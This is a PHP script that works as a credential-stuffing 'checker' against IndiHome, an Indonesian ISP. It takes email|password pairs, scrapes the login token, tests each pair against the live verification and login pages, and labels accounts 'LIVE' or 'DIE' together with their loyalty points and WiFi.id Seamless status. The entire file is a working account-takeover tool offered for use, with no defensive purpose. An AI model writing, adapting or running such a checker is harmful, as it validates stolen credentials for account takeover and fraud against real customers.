<?php
$format = $_POST['mailpass'];
$pisah = explode("|", $format);
$email = "$pisah[0]";
$password ="$pisah[1]";
require 'includes/class_curl.php';

if (!isset($format)) {
header('location: ./');
exit;
}

$curl = new curl();
$curl->cookies(getcwd().'/cookies/'.md5($_SERVER['REMOTE_ADDR']).'.txt');
$curl->ssl(0, 2);
$url = "https://indihome.co.id/verifikasi-layanan/cek-email";
$url1 = "https://indihome.co.id/verifikasi-layanan/login";
$url2 = "https://indihome.co.id/addon/wifiid-seamless";

$page = $curl->get($url);
$Token = fetch_value($page,'name="_token" value="','"');

if ($page) {
$headers[] = 'Origin: https://indihome.co.id';
$headers[] = 'Content-Type: application/x-www-form-urlencoded';
$headers[] = 'Referer: https://indihome.co.id/verifikasi-layanan/cek-email';
$headers[] = 'Accept-Language: id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7';

$curl->header($headers);
$data = "_token=$Token&email=$email";
$page1 = $curl->post($url, $data);
if (inStr($page1, "https://indihome.co.id/verifikasi-layanan/signup")) {
die('{"error":2,"msg":"<font color=red><b>DIE</b></font> '.$email.' | '.$password.' [ tidak terdaftar ] "}');
exit;
    }
$headers[] = 'Origin: https://indihome.co.id';
$headers[] = 'Content-Type: application/x-www-form-urlencoded';
$headers[] = 'Referer: https://indihome.co.id/verifikasi-layanan/login';
$headers[] = 'Accept-Language: id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7';

$curl->header($headers);
$data = "_token=$Token&email=$email&password=$password";
$page2 = $curl->post($url1, $data);
$notif = fetch_value($page2,'<b>Gagal!</b>','</div>');
$point = fetch_value($page2,'<a href="https://www.indihome.co.id/poin">','</a>');
$point = str_replace(" ", "", $point);

if (inStr($page2, "Gagal!")) {
die('{"error":2,"msg":"<font color=red><b>DIE</b></font> '.$email.' | '.$password.' [ '.$notif.' ] "}');
exit;
    }
$page3 = $curl->get($url2);

if (inStr($page3, "Dengan mendaftar saya setuju dengan")) {
die('{"error":0,"msg":"<font color=green><b>LIVE</b></font> '.$email.' | '.$password.' [ <font color=red><b>Tidak Terdaftar Seamless</b></font> ] [ Point :'. $point.' ]  "}');
}
else if (inStr($page3, "Daftar Perangkat")) {
die('{"error":0,"msg":"<font color=green><b>LIVE</b></font> '.$email.' | '.$password.' [ <font color=green><b>Terdaftar Seamless</b></font> ] [ Point :'. $point.' ] "}');
}
else if (inStr($page3, "Verifikasi OTP")) {
die('{"error":0,"msg":"<font color=red><b>LIVE</b></font> '.$email.' | '.$password.' [ OTP BANGSAT ] "}');
}
else {
      die('{"error":-1,"msg":"<font color=Black><b>UKNOWN</b></font>   '.$email.' | '.$password.' [ Lapor Admin Web Checker ] "}');
}
}

  ?>
  